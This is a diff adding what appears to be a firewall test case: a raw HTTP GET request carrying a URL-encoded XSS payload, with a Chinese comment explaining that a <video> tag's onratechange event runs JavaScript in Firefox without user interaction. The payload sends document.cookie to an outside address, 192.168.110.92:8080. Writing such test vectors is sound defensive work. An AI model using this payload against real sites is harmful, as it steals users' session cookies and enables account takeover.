@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_HTML5的向量_video-06506801
+# 通过 <VIDEO> 使用空的SRC和onratechange事件执行JavaScript代码，<VIDEO> 元素在没有用户交互的情况下在 Firefox 上会触发一个“onratechange”事件，即使没有给出“src”属性的实际值。
+GET /?id=%3Cvideo%20src%20onratechange=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3E&bid=hd_tag_m8mv251l HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv251l
+RM-PRO-Token: 2a520628d6d76464fdb1f2df1c4721c6
+RM-PRO-Time: 1742808430912
+User-Agent: curl/7.83.1
+
